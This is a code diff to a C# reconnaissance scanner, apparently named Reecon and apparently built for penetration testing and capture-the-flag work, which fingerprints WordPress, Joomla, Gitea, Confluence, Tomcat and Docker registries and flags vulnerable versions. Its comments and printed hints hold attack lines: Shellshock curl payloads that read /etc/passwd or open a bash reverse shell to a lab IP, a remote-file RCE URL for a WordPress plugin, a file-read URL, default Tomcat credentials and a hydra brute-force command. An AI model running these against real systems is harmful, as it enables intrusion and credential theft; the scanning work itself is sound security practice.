@@ -56,7 +56,7 @@ namespace Reecon
 
         public static void ScanPage(string url)
         {
-            
+
         }
 
         public static string FindInfo(string pageText, bool doubleDash = false)
@@ -335,9 +335,8 @@ namespace Reecon
                 // Bolt CMS
                 "bolt-public/img/bolt-logo.png",
                 // Shellshock
-                "cgi-bin/", // Test: curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd;" http://1.2.3.4/cgi-bin/valid.cgi
-                            // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi
-                            // Well-Known
+                "cgi-bin/", 
+                // Well-Known
                 ".well-known/", // https://www.google.com/.well-known/security.txt
                 // Docker
                 "version",
@@ -455,6 +454,14 @@ namespace Reecon
                                 // These aren't meant to be params
                                 returnText += "---- Get Index Info: GET /{index}/_search/?pretty&size={docs.count}" + Environment.NewLine;
                             }
+                            // Shellshock
+                            else if (file == "cgi-bin/")
+                            {
+                                // curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://path/cgi-bin/valid.cgi
+                                returnText += "-- Possible Shellshock - Search for valid files inside here" + Environment.NewLine;
+                                returnText += "--- // Test: curl -H 'User-Agent: () { :;}; echo; /bin/cat /etc/passwd;' http://1.2.3.4/cgi-bin/valid.cgi" + Environment.NewLine;
+                                // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi"
+                            }
                             else
                             {
                                 if (response.PageTitle.StartsWith("Index of /"))
@@ -555,8 +562,7 @@ namespace Reecon
                     returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
                     if (dockerVersion == "registry/2.0")
                     {
-                        WebClient wc = new();
-                        string repoText = wc.DownloadString($"{url}v2/_catalog");
+                        string repoText = General.DownloadString($"{url}v2/_catalog");
                         if (repoText.Contains("repositories"))
                         {
                             try
@@ -565,7 +571,7 @@ namespace Reecon
                                 foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
                                 {
                                     returnText += "--- Repo Found: " + item + Environment.NewLine;
-                                    string tagList = wc.DownloadString($"{url}v2/" + item + "/tags/list");
+                                    string tagList = General.DownloadString($"{url}v2/" + item + "/tags/list");
                                     tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
                                     returnText += "---- Tags Found: " + tagList + Environment.NewLine;
                                     // /v2/cmnatic/myapp1/tags/list
@@ -746,11 +752,7 @@ namespace Reecon
                         responseText += "- Manager (Status) Found - But it requires credentials --> " + managerStatusURL + Environment.NewLine;
                         try
                         {
-                            WebClient wc = new()
-                            {
-                                Credentials = defaultTomcatCreds
-                            };
-                            wc.DownloadString(managerStatusURL);
+                            General.DownloadString(managerStatusURL, Creds: defaultTomcatCreds);
                             responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                         }
                         catch
@@ -775,11 +777,7 @@ namespace Reecon
                         responseText += "- Manager App (HTML) Found - But it requires credentials --> " + managerAppHTMLURL + Environment.NewLine;
                         try
                         {
-                            WebClient wc = new()
-                            {
-                                Credentials = defaultTomcatCreds
-                            };
-                            wc.DownloadString(managerAppHTMLURL);
+                            General.DownloadString(managerAppHTMLURL, Creds: defaultTomcatCreds);
                             responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                         }
                         catch
@@ -804,11 +802,7 @@ namespace Reecon
                         responseText += "- Manager App (Text) Found - But it requires credentials --> " + managerAppTextURL + Environment.NewLine;
                         try
                         {
-                            WebClient wc = new()
-                            {
-                                Credentials = defaultTomcatCreds
-                            };
-                            wc.DownloadString(managerAppTextURL);
+                            General.DownloadString(managerAppTextURL, Creds: defaultTomcatCreds);
                             responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                         }
                         catch
@@ -833,11 +827,7 @@ namespace Reecon
                         responseText += "- Host Manager Found - But it requires credentials --> " + hostManagerURL + Environment.NewLine;
                         try
                         {
-                            WebClient wc = new()
-                            {
-                                Credentials = defaultTomcatCreds
-                            };
-                            wc.DownloadString(hostManagerURL);
+                            General.DownloadString(hostManagerURL, Creds: defaultTomcatCreds);
                             responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                         }
                         catch
@@ -853,158 +843,6 @@ namespace Reecon
                     {
                         responseText += "Unknown Host Manager Status Code: " + hostManagerInfo.StatusCode + Environment.NewLine;
                     }
-                }
-            }
-
-            // Page Text
-            if (PageText.Length > 0)
-            {
-                if (PageText.Length < 250)
-                {
-                    responseText += "- Page Text: " + PageText.Trim() + Environment.NewLine;
-                }
-
-                // concrete5
-                if (PageText.Contains("<meta name=\"generator\" content=\"concrete5 - "))
-                {
-                    responseText += "- " + "concrete5 CMS detected!".Pastel(Color.Orange) + Environment.NewLine;
-                    // <meta name="generator" content="concrete5 - 8.5.2"/>
-                    string versionInfo = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"concrete5 - "));
-                    versionInfo = versionInfo.Remove(0, versionInfo.IndexOf("concrete5 - ") + 12);
-                    versionInfo = versionInfo.Substring(0, versionInfo.IndexOf("\""));
-                    responseText += "-- Version: " + versionInfo + Environment.NewLine;
-                    if (versionInfo == "8.5.2")
-                    {
-                        responseText += "---" + " Vulnerable version detected - Vulnerable to CVE-2020-24986 - https://hackerone.com/reports/768322".Pastel(Color.Orange) + Environment.NewLine;
-                    }
-                }
-
-                // Wordpress
-                //if (PageText.Contains("/wp-content/themes/") && (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\")))
-                // Some Wordpress pages don't contain "wp-content" (Ref: HTB Acute)
-                if (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\"))
-                {
-                    responseText += "- " + "Wordpress detected!".Pastel(Color.Orange) + Environment.NewLine;
-                    // Basic User Enumeration - Need to combine these two...
-                    List<string> wpUsers = new();
-                    var wpUserTestOne = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-json/wp/v2/users");
-                    if (wpUserTestOne.StatusCode == HttpStatusCode.OK)
-                    {
-                        var document = JsonDocument.Parse(wpUserTestOne.PageText);
-                        foreach (JsonElement element in document.RootElement.EnumerateArray())
-                        {
-                            string wpUserName = element.GetProperty("name").GetString();
-                            string wpUserSlug = element.GetProperty("slug").GetString();
-                            if (!wpUsers.Contains(wpUserName))
-                            {
-                                wpUsers.Add(wpUserSlug);
-                                responseText += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Pastel(Color.Orange) + Environment.NewLine;
-                            }
-                        }
-                    }
-                    var wpUserTestTwo = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/index.php/wp-json/wp/v2/users");
-                    if (wpUserTestTwo.StatusCode == HttpStatusCode.OK)
-                    {
-                        var document = JsonDocument.Parse(wpUserTestTwo.PageText);
-                        foreach (JsonElement element in document.RootElement.EnumerateArray())
-                        {
-                            string wpUserName = element.GetProperty("name").GetString();
-                            string wpUserSlug = element.GetProperty("slug").GetString();
-                            if (!wpUsers.Contains(wpUserName))
-                            {
-                                wpUsers.Add(wpUserSlug);
-                                responseText += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Pastel(Color.Orange) + Environment.NewLine;
-                            }
-                        }
-                    }
-
-                    // Basic vulnerable addons
-                    if (PageText.Contains("/wp-with-spritz/"))
-                    {
-                        responseText += "-- " + "Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {urlPrefix}://{DNS}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
-                    }
-                    else if (PageText.Contains("/wp-content/plugins/social-warfare"))
-                    {
-                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - http://192.168.56.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
-                        responseText += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
-                    }
-
-                    // Check for public folders
-                    var contentDir = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-content/");
-                    if (contentDir.StatusCode == HttpStatusCode.OK && contentDir.PageText.Length != 0)
-                    {
-                        responseText += "-- " + $"{urlPrefix}://{DNS}/wp-content/ is public".Pastel(Color.Orange) + Environment.NewLine;
-                    }
-                    var pluginsDir = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-content/plugins/");
-                    if (pluginsDir.StatusCode == HttpStatusCode.OK && pluginsDir.PageText.Length != 0)
-                    {
-                        responseText += "-- " + $"{urlPrefix}://{DNS}/wp-content/plugins/ is public".Pastel(Color.Orange) + Environment.NewLine;
-                    }
-
-                    responseText += $"-- User Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5" + Environment.NewLine;
-                    responseText += $"-- Plugin Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate p" + Environment.NewLine;
-                    responseText += $"-- User + Plugin Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5,p" + Environment.NewLine;
-
-                    // Checking for wp-login.php
-                    var wplogin = GetHTTPInfo($"{urlPrefix}://{DNS}/wp-login.php");
-                    string wpLoginPath = "/blog/wp-login.php";
-                    if (wplogin.StatusCode == HttpStatusCode.OK && wplogin.PageText.Contains("action=lostpassword"))
-                    {
-                        wpLoginPath = "/wp-login.php";
-                    }
-                    responseText += $"-- hydra -L users.txt -P passwords.txt {DNS} http-post-form \"{wpLoginPath}:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:The password you entered for the username\" -I -t 50" + Environment.NewLine;
-                }
-
-                // Joomla!
-                else if (PageText.Contains("com_content") && PageText.Contains("com_users"))
-                {
-                    responseText += "- " + "Joomla! Detected".Pastel(Color.Orange) + Environment.NewLine;
-                    var adminXML = GetHTTPInfo($"{URL}administrator/manifests/files/joomla.xml");
-                    if (adminXML.StatusCode == HttpStatusCode.OK)
-                    {
-                        if (adminXML.PageText.Contains("<version>") && adminXML.PageText.Contains("</version>"))
-                        {
-                            string versionText = adminXML.PageText.Remove(0, adminXML.PageText.IndexOf("<version>") + "<version>".Length);
-                            versionText = versionText.Substring(0, versionText.IndexOf("</version"));
-                            responseText += $"-- Joomla! Version: {versionText}".Pastel(Color.Orange) + Environment.NewLine;
-                        }
-                    }
-                    else
-                    {
-                        var tinyXML = GetHTTPInfo($"{URL}plugins/editors/tinymce/tinymce.xml");
-                        if (tinyXML.StatusCode == HttpStatusCode.OK)
-                        {
-                            // https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http
-                            responseText += "- TinyMCE use case hit - Bug Reelix to finish this!" + Environment.NewLine;
-                        }
-                    }
-                }
-
-                // Gitea
-                // Cookie Title Added: i_like_gitea
-                else if (PageText.Contains("Powered by Gitea"))
-                {
-                    responseText += "- " + "Gitea detected!".Pastel(Color.Orange) + Environment.NewLine;
-                    if (PageText.Contains("AppVer: '") && PageText.Contains("AppSubUrl:"))
-                    {
-                        string giteaVersion = PageText.Remove(0, PageText.IndexOf("AppVer: '") + 9);
-                        giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf("'"));
-                        System.Version theVersion = System.Version.Parse(giteaVersion);
-                        // Version: >= 1.1.0 to <= 1.12.5
-                        if (theVersion.Major == 1 && theVersion.Minor <= 12)
-                        {
-                            responseText += "-- " + $"Vulnerable Gitea Version Detected {giteaVersion} -> https://www.exploit-db.com/raw/49571".Pastel(Color.Orange) + Environment.NewLine;
-                        }
-                        responseText += "-- Non Vulnerable Version Detected: " + giteaVersion + Environment.NewLine;
-                        responseText += "-- If you gain access, see if you can alter gitea.db (User table)" + Environment.NewLine;
-                    }
-                }
-
-                // Icecast
-                else if (PageText.Trim() == "<b>The source you requested could not be found.</b>")
-                {
-                    responseText += "-- Possible Icecast Server detected" + Environment.NewLine; // Thanks nmap!
-                    responseText += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
                 }
             }
 
@@ -1248,6 +1086,212 @@ namespace Reecon
                 otherHeaders = otherHeaders.Trim(',');
                 responseText += "- Other Headers: " + otherHeaders + Environment.NewLine;
             }
+
+            // Page Text (Body)
+            if (PageText.Length > 0)
+            {
+                if (PageText.Length < 250)
+                {
+                    responseText += "- Page Text: " + PageText.Trim() + Environment.NewLine;
+                }
+
+                // concrete5
+                if (PageText.Contains("<meta name=\"generator\" content=\"concrete5 - "))
+                {
+                    responseText += "- " + "concrete5 CMS detected!".Pastel(Color.Orange) + Environment.NewLine;
+                    // <meta name="generator" content="concrete5 - 8.5.2"/>
+                    string versionInfo = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"concrete5 - "));
+                    versionInfo = versionInfo.Remove(0, versionInfo.IndexOf("concrete5 - ") + 12);
+                    versionInfo = versionInfo.Substring(0, versionInfo.IndexOf("\""));
+                    responseText += "-- Version: " + versionInfo + Environment.NewLine;
+                    if (versionInfo == "8.5.2")
+                    {
+                        responseText += "---" + " Vulnerable version detected - Vulnerable to CVE-2020-24986 - https://hackerone.com/reports/768322".Pastel(Color.Orange) + Environment.NewLine;
+                    }
+                }
+
+                // Confluence
+                if (PageText.Contains("Printed by Atlassian Confluence"))
+                {
+                    string confluenceVersionText = PageText.Remove(0, PageText.IndexOf("Printed by Atlassian Confluence ") + 32);
+                    confluenceVersionText = confluenceVersionText.Substring(0, confluenceVersionText.IndexOf("</li>"));
+                    Version version = Version.Parse(confluenceVersionText);
+
+                    // CVE-2022-26134 (Version on the right is fixed)
+                    // 1.3.0 -> 7.4.17
+                    // 7.13.0 -> 7.13.7
+                    // 7.14.0 -> 7.14.3 
+                    // 7.15.0 -> 7.15.2 
+                    // 7.16.0 -> 7.16.4
+                    // 7.17.0 -> 7.17.4
+                    // 7.18.0 -> 7.18.1 
+                    bool isVulnerable = false;
+                    if (version >= Version.Parse("1.3.0") && version < Version.Parse("7.4.17"))
+                    {
+                        isVulnerable = true;
+                    }
+                    else if (version >= Version.Parse("7.13.0") && version < Version.Parse("7.13.7"))
+                    {
+                        isVulnerable = true;
+                    }
+                    else if (version >= Version.Parse("7.14.0") && version < Version.Parse("7.14.3"))
+                    {
+                        isVulnerable = true;
+                    }
+                    else if (version >= Version.Parse("7.15.0") && version < Version.Parse("7.15.2"))
+                    {
+                        isVulnerable = true;
+                    }
+                    else if (version >= Version.Parse("7.16.0") && version < Version.Parse("7.16.4"))
+                    {
+                        isVulnerable = true;
+                    }
+                    else if (version >= Version.Parse("7.17.0") && version < Version.Parse("7.17.4"))
+                    {
+                        isVulnerable = true;
+                    }
+                    else if (version >= Version.Parse("7.18.0") && version < Version.Parse("7.18.1"))
+                    {
+                        isVulnerable = true;
+                    }
+
+                    if (isVulnerable)
+                    {
+                        responseText += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} -> https://github.com/Nwqda/CVE-2022-26134".Pastel(Color.Orange) + Environment.NewLine;
+                    }
+                }
+
+                // Gitea
+                // Cookie Title Added: i_like_gitea
+                if (PageText.Contains("Powered by Gitea"))
+                {
+                    responseText += "- " + "Gitea detected!".Pastel(Color.Orange) + Environment.NewLine;
+                    if (PageText.Contains("AppVer: '") && PageText.Contains("AppSubUrl:"))
+                    {
+                        string giteaVersion = PageText.Remove(0, PageText.IndexOf("AppVer: '") + 9);
+                        giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf("'"));
+                        Version theVersion = System.Version.Parse(giteaVersion);
+                        // Version: >= 1.1.0 to <= 1.12.5
+                        if (theVersion.Major == 1 && theVersion.Minor <= 12)
+                        {
+                            responseText += "-- " + $"Vulnerable Gitea Version Detected {giteaVersion} -> https://www.exploit-db.com/raw/49571".Pastel(Color.Orange) + Environment.NewLine;
+                        }
+                        responseText += "-- Non Vulnerable Version Detected: " + giteaVersion + Environment.NewLine;
+                        responseText += "-- If you gain access, see if you can alter gitea.db (User table)" + Environment.NewLine;
+                    }
+                }
+
+                // Icecast
+                if (PageText.Trim() == "<b>The source you requested could not be found.</b>")
+                {
+                    responseText += "-- Possible Icecast Server detected" + Environment.NewLine; // Thanks nmap!
+                    responseText += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
+                }
+
+                // Joomla!
+                if (PageText.Contains("com_content") && PageText.Contains("com_users"))
+                {
+                    responseText += "- " + "Joomla! Detected".Pastel(Color.Orange) + Environment.NewLine;
+                    var adminXML = GetHTTPInfo($"{URL}administrator/manifests/files/joomla.xml");
+                    if (adminXML.StatusCode == HttpStatusCode.OK)
+                    {
+                        if (adminXML.PageText.Contains("<version>") && adminXML.PageText.Contains("</version>"))
+                        {
+                            string versionText = adminXML.PageText.Remove(0, adminXML.PageText.IndexOf("<version>") + "<version>".Length);
+                            versionText = versionText.Substring(0, versionText.IndexOf("</version"));
+                            responseText += $"-- Joomla! Version: {versionText}".Pastel(Color.Orange) + Environment.NewLine;
+                        }
+                    }
+                    else
+                    {
+                        var tinyXML = GetHTTPInfo($"{URL}plugins/editors/tinymce/tinymce.xml");
+                        if (tinyXML.StatusCode == HttpStatusCode.OK)
+                        {
+                            // https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http
+                            responseText += "- TinyMCE use case hit - Bug Reelix to finish this!" + Environment.NewLine;
+                        }
+                    }
+                }
+
+                // Wordpress
+                //if (PageText.Contains("/wp-content/themes/") && (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\")))
+                // Some Wordpress pages don't contain "wp-content" (Ref: HTB Acute)
+                if (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\"))
+                {
+                    responseText += "- " + "Wordpress detected!".Pastel(Color.Orange) + Environment.NewLine;
+                    // Basic User Enumeration - Need to combine these two...
+                    List<string> wpUsers = new();
+                    var wpUserTestOne = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-json/wp/v2/users");
+                    if (wpUserTestOne.StatusCode == HttpStatusCode.OK)
+                    {
+                        var document = JsonDocument.Parse(wpUserTestOne.PageText);
+                        foreach (JsonElement element in document.RootElement.EnumerateArray())
+                        {
+                            string wpUserName = element.GetProperty("name").GetString();
+                            string wpUserSlug = element.GetProperty("slug").GetString();
+                            if (!wpUsers.Contains(wpUserName))
+                            {
+                                wpUsers.Add(wpUserSlug);
+                                responseText += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Pastel(Color.Orange) + Environment.NewLine;
+                            }
+                        }
+                    }
+                    var wpUserTestTwo = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/index.php/wp-json/wp/v2/users");
+                    if (wpUserTestTwo.StatusCode == HttpStatusCode.OK)
+                    {
+                        var document = JsonDocument.Parse(wpUserTestTwo.PageText);
+                        foreach (JsonElement element in document.RootElement.EnumerateArray())
+                        {
+                            string wpUserName = element.GetProperty("name").GetString();
+                            string wpUserSlug = element.GetProperty("slug").GetString();
+                            if (!wpUsers.Contains(wpUserName))
+                            {
+                                wpUsers.Add(wpUserSlug);
+                                responseText += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Pastel(Color.Orange) + Environment.NewLine;
+                            }
+                        }
+                    }
+
+                    // Basic vulnerable addons
+                    if (PageText.Contains("/wp-with-spritz/"))
+                    {
+                        responseText += "-- " + "Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {urlPrefix}://{DNS}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
+                    }
+                    else if (PageText.Contains("/wp-content/plugins/social-warfare"))
+                    {
+                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - http://192.168.56.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
+                        responseText += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
+                    }
+
+                    // Check for public folders
+                    var contentDir = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-content/");
+                    if (contentDir.StatusCode == HttpStatusCode.OK && contentDir.PageText.Length != 0)
+                    {
+                        responseText += "-- " + $"{urlPrefix}://{DNS}/wp-content/ is public".Pastel(Color.Orange) + Environment.NewLine;
+                    }
+                    var pluginsDir = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-content/plugins/");
+                    if (pluginsDir.StatusCode == HttpStatusCode.OK && pluginsDir.PageText.Length != 0)
+                    {
+                        responseText += "-- " + $"{urlPrefix}://{DNS}/wp-content/plugins/ is public".Pastel(Color.Orange) + Environment.NewLine;
+                    }
+
+                    responseText += $"-- User Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5" + Environment.NewLine;
+                    responseText += $"-- Plugin Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate p" + Environment.NewLine;
+                    responseText += $"-- User + Plugin Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5,p" + Environment.NewLine;
+
+                    // Checking for wp-login.php
+                    var wplogin = GetHTTPInfo($"{urlPrefix}://{DNS}/wp-login.php");
+                    string wpLoginPath = "/blog/wp-login.php";
+                    if (wplogin.StatusCode == HttpStatusCode.OK && wplogin.PageText.Contains("action=lostpassword"))
+                    {
+                        wpLoginPath = "/wp-login.php";
+                    }
+                    responseText += $"-- hydra -L users.txt -P passwords.txt {DNS} http-post-form \"{wpLoginPath}:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:The password you entered for the username\" -I -t 50" + Environment.NewLine;
+                }
+
+            }
+
+            // SSL Cert
             if (SSLCert != null)
             {
                 X509Certificate2 theCert = SSLCert;
